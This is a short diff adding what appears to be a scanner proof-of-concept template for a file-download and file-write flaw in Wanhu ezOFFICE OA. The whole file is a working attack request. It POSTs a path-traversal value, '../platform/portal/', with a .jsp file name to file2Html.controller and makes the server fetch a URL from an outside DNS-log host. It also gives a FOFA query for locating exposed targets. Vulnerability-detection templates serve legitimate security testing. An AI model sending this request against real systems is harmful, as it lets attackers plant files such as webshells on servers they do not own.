@@ -1,0 +1,23 @@
+id: poc-yaml-wanhu-ezoffice-file2Html-controller-anyfile-download
+info:
+  name: 万户OA file2Html.controller远程下载文件
+  severity: critical
+  tags:
+  - DNSLOG
+  - ssrf
+  - 两高一弱
+  finger: 万户OA ezoffice
+  fofa: app="万户网络-ezOFFICE"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /defaultroot/yzConvertFile/file2Html.controller
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: fileName=qwe.jsp&path=../platform/portal/&url=http://{{.domain}}
+  expression: 'reverse.Sleep(2)
+
+    '
+transport: http
